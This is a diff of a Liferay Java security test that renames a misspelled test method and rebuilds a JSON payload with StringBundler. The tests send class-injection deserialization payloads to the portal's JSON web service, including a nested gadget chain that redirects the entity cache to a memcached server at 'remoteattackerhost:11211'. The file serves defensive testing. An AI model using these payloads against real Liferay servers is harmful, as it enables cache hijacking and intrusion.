@@ -16,6 +16,7 @@ package com.liferay.portal.jsonwebservice;
 
 import com.liferay.portal.jsonwebservice.dependencies.OpenService;
 import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
+import com.liferay.portal.kernel.util.StringBundler;
 
 import junit.framework.TestCase;
 
@@ -40,7 +41,7 @@ public class JSONWebServiceSecureTest extends JSONWebServiceAbstractTest {
 	public void testAttack1() throws Exception {
 
 		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
-				"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");
+			"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");
 
 		JSONWebServiceAction jsonWebServiceAction = lookupAction(
 			mockHttpServletRequest);
@@ -55,13 +56,36 @@ public class JSONWebServiceSecureTest extends JSONWebServiceAbstractTest {
 	}
 
 	@Test
-	public void testAtack2() throws Exception {
+	public void testAttack2() throws Exception {
 
 		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
 			"/open/run2");
 
-		mockHttpServletRequest.setParameter("bytes",
-			"{\"class\":\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",\"entityCache\":{\"class\":\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",\"multiVMPool\":{\"class\":\"com.liferay.portal.cache.MultiVMPoolImpl\",\"portalCacheManager\":{\"class\":\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager\",\"timeout\":60,\"timeoutTimeUnit\":\"SECONDS\",\"memcachedClientPool\":{\"class\":\"com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory\",\"connectionFactory\":{\"class\":\"net.spy.memcached.BinaryConnectionFactory\"},\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");
+		StringBundler sb = new StringBundler(15);
+
+		sb.append("{\"class\":");
+		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");
+
+		sb.append("\"entityCache\":{\"class\":");
+		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");
+
+		sb.append("\"multiVMPool\":{\"class\":");
+		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");
+
+		sb.append("\"portalCacheManager\":{\"class\":");
+		sb.append(
+			"\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager");
+		sb.append("\",\"timeout\":60,\"timeoutTimeUnit\":\"SECONDS\",");
+
+		sb.append("\"memcachedClientPool\":{\"class\":");
+		sb.append("\"com.liferay.portal.cache.memcached.");
+		sb.append("DefaultMemcachedClientFactory\",");
+
+		sb.append("\"connectionFactory\":{\"class\":");
+		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
+		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");
+
+		mockHttpServletRequest.setParameter("bytes", sb.toString());
 
 		JSONWebServiceAction jsonWebServiceAction = lookupAction(
 			mockHttpServletRequest);
